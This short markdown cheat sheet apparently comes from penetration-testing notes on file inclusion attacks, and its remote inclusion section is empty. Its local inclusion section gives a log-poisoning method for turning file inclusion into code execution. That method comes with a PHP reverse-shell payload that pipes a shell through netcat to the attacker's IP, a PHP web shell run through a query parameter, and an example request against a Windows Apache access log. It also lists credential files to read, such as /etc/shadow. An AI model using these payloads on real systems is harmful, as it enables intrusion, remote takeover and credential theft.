# Local & Remote File Inclusion Attacks
> tips for exploiting LFI/RFI on a web app

## LFI
-----
#### Log Poisoning -> LFI to RCE
- if you can use LFI to retrieve log resource
1. set listener
2. change user-agent to this to this and then submit and use LFI again to request log resource
```<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [my-ip] 4444 >/tmp/f') ?>```
- Alternative method: 
1. connect via nc
```nc -nv [ip] 80```
2. send payload: 
```<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>```
- ignore the potential 400 Bad Request response
3. request the log file to execute the injected code (windows): 
```http://[ip]/examplePage.php?vulnerable=c:\xampp\apache\logs\access.log&cmd=ipconfig```

##### Files to check if you can read
- /etc/passwd -> find users on the system
- /etc/shadow -> if you can read this than the server is running the web app with root user, any rev shell will be auto-rooted
- 'c:\boot.ini' -> 


## RFI
------
